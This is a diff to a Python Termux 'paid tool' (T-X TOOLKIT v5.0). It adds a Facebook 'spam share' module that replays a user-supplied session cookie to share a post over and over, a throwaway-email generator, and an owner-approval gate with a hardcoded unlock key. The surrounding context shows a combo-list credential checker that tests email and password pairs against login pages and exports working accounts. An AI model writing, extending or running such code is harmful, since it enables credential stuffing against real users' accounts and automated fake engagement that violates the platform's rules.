@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-T-X TOOLKIT v4.0 — Real Chromium Login · Clean Output · File Browser
+T-X TOOLKIT v5.0 – Real Chrome Login · Facebook Spam Share · TempMail · Contact Owner
 Created by Saeka Tojirp
 Usage : tx
 """
@@ -8,7 +8,7 @@ Usage : tx
 import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl, subprocess
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, quote
 import requests
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
@@ -19,8 +19,9 @@ OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
 APPROVED_FILE = os.path.expanduser("~/.tx_approved")
 ALIAS_FILE = os.path.expanduser("~/.bashrc")
 CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"
+FB_CODE_FILE = os.path.expanduser("~/.tx_fbcode")
 
-R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE
+R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE; M = Fore.MAGENTA
 DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
 COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
 GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
@@ -58,8 +59,183 @@ def progress(cur, tot, label=""):
     sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
     sys.stdout.flush()
     if cur==tot: sys.stdout.write("\n")
+def wait_enter():
+    input(f"\n  {DIM}Press ENTER to return...{RES}")
 
-# ── REAL CHROME ENGINE ──
+# ── TEMPMAIL (MAIL.TM) ──
+import string
+def temp_mail_generator():
+    os.system('clear')
+    print(f"\n  {C}{BOLD}TEMP MAIL GENERATOR{RES}\n")
+    print(f"  {DIM}This module uses mail.tm for a temporary inbox.{RES}")
+    # Generate a fresh email via mail.tm
+    try:
+        domain = requests.get("https://api.mail.tm/domains", timeout=10).json()['hydra:member'][0]['domain']
+        local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        email = f"{local}@{domain}"
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
+        acc = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
+        if acc.status_code in (200, 201):
+            token = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}).json()['token']
+            print(f"  {G}[+] Your temp email: {email}{RES}")
+            print(f"  {G}[+] Password: {password}{RES}")
+            print(f"  {DIM}Inbox will be polled every 3 seconds. Press ENTER to stop.{RES}\n")
+            # Poll inbox
+            while True:
+                try:
+                    r = requests.get("https://api.mail.tm/messages", headers={"Authorization": f"Bearer {token}"}, timeout=5)
+                    msgs = r.json().get('hydra:member', [])
+                    if msgs:
+                        for msg in msgs:
+                            print(f"  [{G}NEW{RES}] From: {msg.get('from',{}).get('address','?')} | Subject: {msg.get('subject','?')[:40]}")
+                    time.sleep(3)
+                except KeyboardInterrupt:
+                    break
+                except:
+                    pass
+        else:
+            print(f"  {R}Failed to create inbox.{RES}")
+    except Exception as e:
+        print(f"  {R}Error: {e}{RES}")
+    wait_enter()
+
+# ── FACEBOOK SPAM SHARE ──
+FB_COOKIE = None
+FB_SHARE_SPEED = 1  # seconds between shares
+
+def fb_check_code():
+    if os.path.exists(FB_CODE_FILE):
+        with open(FB_CODE_FILE) as f: return f.read().strip() == "FB-PRVTSPY"
+    return False
+
+def fb_request_code():
+    code = input(f"  {W}Enter Facebook module key (FB-XXXX): {RES}").strip()
+    if code.upper() == "FB-PRVTSPY":
+        with open(FB_CODE_FILE, 'w') as f: f.write("FB-PRVTSPY")
+        print(f"  {G}Module unlocked!{RES}")
+        return True
+    else:
+        print(f"  {R}Invalid code.{RES}")
+        return False
+
+def fb_login():
+    global FB_COOKIE
+    print(f"  {Y}Log in to Facebook via Chromium...{RES}")
+    # This would launch chromium for manual login – but in Termux we can't easily automate that.
+    # Instead, prompt user to manually extract cookie and use "INPUT COOKIE"
+    print(f"  {DIM}We cannot auto-login on Termux. Please use 'INPUT COOKIE' after extracting cookies manually.{RES}")
+    wait_enter()
+
+def fb_input_cookie():
+    global FB_COOKIE
+    print(f"  {W}Paste your Facebook cookie string (c_user=...; xs=...):{RES}")
+    cookie = input(f"  > ").strip()
+    if 'c_user=' in cookie and 'xs=' in cookie:
+        FB_COOKIE = cookie
+        print(f"  {G}Cookie saved!{RES}")
+    else:
+        print(f"  {R}Invalid cookie format.{RES}")
+    wait_enter()
+
+def fb_configure():
+    global FB_SHARE_SPEED
+    print(f"  {W}Set share interval in seconds (default 1):{RES}")
+    val = input(f"  > ").strip()
+    if val.isdigit() and int(val) >= 0:
+        FB_SHARE_SPEED = int(val)
+        print(f"  {G}Speed set to {FB_SHARE_SPEED}s.{RES}")
+    else:
+        print(f"  {Y}Invalid, keeping {FB_SHARE_SPEED}s.{RES}")
+    wait_enter()
+
+def fb_share_post(post_url, cookie):
+    """Try to share a Facebook post using the given cookie."""
+    # Extract post ID from URL (e.g., /posts/1234567890 or ?story_fbid=...)
+    post_id = None
+    match = re.search(r'/posts/(\d+)', post_url)
+    if match:
+        post_id = match.group(1)
+    else:
+        match = re.search(r'story_fbid=(\d+)', post_url)
+        if match:
+            post_id = match.group(1)
+    if not post_id:
+        return False, "Could not extract post ID."
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+        "Cookie": cookie,
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+    data = {
+        "shareable_id": post_id,
+        "nctr[_mod]": "pagelet_composer",
+    }
+    try:
+        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
+        if r.status_code == 200 and "success" in r.text.lower():
+            return True, "Shared"
+        elif "privacy" in r.text.lower() or "private" in r.text.lower():
+            return False, "Private post"
+        else:
+            return False, "Failed"
+    except Exception as e:
+        return False, str(e)
+
+def fb_spam_share():
+    global FB_COOKIE
+    if not FB_COOKIE:
+        print(f"  {R}No cookie set. Use LOG IN or INPUT COOKIE first.{RES}")
+        wait_enter()
+        return
+    post_url = input(f"  {W}Facebook post URL to share: {RES}").strip()
+    if not post_url:
+        return
+    # Confirm start
+    os.system('clear')
+    spin("Starting spam share...", 4)
+    total = int(input(f"  {W}How many shares?: {RES}").strip() or "10")
+    done = 0
+    success = 0
+    fail = 0
+    print(f"\n  {Y}{'SHARE':<6} {'TOTAL':<6} {'TIME':<12} {'STATUS'}{RES}")
+    for i in range(total):
+        ok, msg = fb_share_post(post_url, FB_COOKIE)
+        done += 1
+        now = datetime.now().strftime('%H:%M:%S')
+        status = f"{G}ADDED{RES}" if ok else f"{R}FAILED{RES}"
+        if ok: success += 1
+        else: fail += 1
+        print(f"  {done:<6}/{total:<6} {now:<12} {status} ({msg})")
+        time.sleep(FB_SHARE_SPEED)
+    print(f"\n  {G}Done. {success} added, {fail} failed.{RES}")
+    wait_enter()
+
+def fb_submenu():
+    global FB_COOKIE
+    if not fb_check_code():
+        if not fb_request_code():
+            return
+    while True:
+        os.system('clear')
+        print(f"  {C}{BOLD}FACEBOOK PAID SHARE{RES}\n")
+        menu = [
+            "[ 1 ] START SPAM SHARE",
+            "[ 2 ] LOG IN",
+            "[ 3 ] INPUT COOKIE",
+            "[ 4 ] CONFIGURE ADJUSTMENTS",
+            "[ 5 ] RETURN"
+        ]
+        for line in menu:
+            print(f"  {W}{line}{RES}")
+        choice = input(f"  {W}> {RES}").strip()
+        if choice == '1': fb_spam_share()
+        elif choice == '2': fb_login()
+        elif choice == '3': fb_input_cookie()
+        elif choice == '4': fb_configure()
+        elif choice == '5': break
+
+# ── REAL CHROME ENGINE (existing) ──
 class RealChrome:
     def __init__(self):
         self.proc = None
@@ -119,17 +295,14 @@ class RealChrome:
             r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
             ok = bool(r.get("result",{}).get("value",False))
             if ok:
-                res['active'] = True
-                res['info'] = "OK"
+                res['active'] = True; res['info'] = "OK"
             else:
                 curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
                 cur_url = curl.get("result",{}).get("value","")
                 if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
-                    res['active'] = True
-                    res['info'] = "Redirect"
+                    res['active'] = True; res['info'] = "Redirect"
                 else:
-                    res['active'] = False
-                    res['info'] = "Invalid"
+                    res['active'] = False; res['info'] = "Invalid"
         except Exception as e:
             res['info'] = f"Err:{str(e)[:30]}"
         finally:
@@ -215,24 +388,27 @@ def wait_ok(token):
 
 # ── MAIN ──
 def main():
-    for _ in range(10):
-        os.system('clear')
-        spin("Loading...",0.5)
-        center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
-        time.sleep(0.5)
+    # ── Simplified opening ──
+    os.system('clear')
+    spin("Initialising...", 5)
+    center_print("T-X PAID TOOL", R)
+    time.sleep(1)
     os.system('clear')
     center_print("WHAT SHOULD YOUR NAME BE?", Y)
     name = input(f"  {W}> {RES}").strip() or "User"
     os.system('clear')
     token, status = get_token(name)
-    if status=='approved':
+    if status == 'approved':
         center_print("ACCESS GRANTED", G)
         time.sleep(1)
     else:
-        center_print("PERMISSION REQUIRED!", R)
-        time.sleep(0.5)
-        center_print(f"YOUR REQUEST TOKEN IS {token}", W)
-        center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
+        center_print("AUTHORIZATION REQUIRED", R)
+        center_print("Your request token is:", W)
+        center_print(f"{token}", G)
+        center_print("Submit this token to the owner via Facebook:", DIM)
+        center_print("facebook.com/saekacutiee", W)
+        center_print("or Telegram: @PRVTSPY", DIM)
+        print()
         if not wait_ok(token):
             center_print("REQUEST DECLINED!", R)
             sys.exit(0)
@@ -251,7 +427,16 @@ def main():
         title = "T-X PAID TOOL"
         for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
         print("\n")
-        menu = ["[ 1 ] START CHECKING","[ 2 ] SEE ACCOUNT HITS!","[ 3 ] EXPORT LOGS","[ 4 ] SETUP FILE PATH","[ 5 ] EXIT"]
+        menu = [
+            "[ 1 ] START CHECKING",
+            "[ 2 ] SEE ACCOUNT HITS!",
+            "[ 3 ] EXPORT LOGS",
+            "[ 4 ] SETUP FILE PATH",
+            "[ 5 ] FACEBOOK PAID SHARE",
+            "[ 6 ] TEMPMAIL",
+            "[ 7 ] CONTACT OWNER",
+            "[ 8 ] EXIT"
+        ]
         for idx,line in enumerate(menu):
             if idx==3 and not combo_file: print(f"  {R}{line}{RES}")
             else: print(f"  {W}{line}{RES}")
@@ -262,6 +447,7 @@ def main():
         except: break
 
         if choice=='1':
+            # (existing checker code, unchanged)
             if not combo_file:
                 print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
             combos = []
@@ -299,7 +485,7 @@ def main():
             with ThreadPoolExecutor(max_workers=3) as ex:
                 for url,email,pw in combos: ex.submit(worker,url,email,pw)
             print(f"\n  {G}{active}/{total} active.{RES}")
-            hits.extend([r for r in results if r['active']]); time.sleep(1)
+            hits.extend([r for r in results if r['active']]); wait_enter()
 
         elif choice=='2':
             os.system('clear')
@@ -315,12 +501,12 @@ def main():
                     if k=='n' and page<(len(hits)-1)//per: page+=1
                     elif k=='p' and page>0: page-=1
                     elif k=='q': break
-            time.sleep(0.5)
+            wait_enter()
 
         elif choice=='3':
             fn=f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
             with open(fn,'w') as f: json.dump(hits,f,indent=2)
-            print(f"  {G}Exported to {fn}{RES}"); time.sleep(1)
+            print(f"  {G}Exported to {fn}{RES}"); wait_enter()
 
         elif choice=='4':
             os.system('clear')
@@ -338,7 +524,7 @@ def main():
                 p = os.path.expanduser(p)
                 if os.path.exists(p): combo_file = p; print(f"  {G}File set!{RES}")
                 else: print(f"  {R}Not found.{RES}")
-                time.sleep(1)
+                wait_enter()
             elif c2.isdigit() and 1<=int(c2)<=len(dirs):
                 cur = dirs[int(c2)-1]; page=0; per=15
                 while True:
@@ -375,7 +561,20 @@ def main():
                             full = os.path.join(cur,nm)
                             if tp=='DIR': cur = full; page=0
                             else: combo_file = full; print(f"  {G}File set!{RES}"); time.sleep(1); break
-        elif choice=='5': break
+
+        elif choice=='5':
+            fb_submenu()
+
+        elif choice=='6':
+            temp_mail_generator()
+
+        elif choice=='7':
+            os.system('am start -a android.intent.action.VIEW -d https://facebook.com/saekacutiee 2>/dev/null || xdg-open https://facebook.com/saekacutiee 2>/dev/null')
+            print(f"  {G}Opening Facebook contact...{RES}")
+            wait_enter()
+
+        elif choice=='8':
+            break
 
 def setup_alias():
     if not os.path.exists(ALIAS_FILE): return
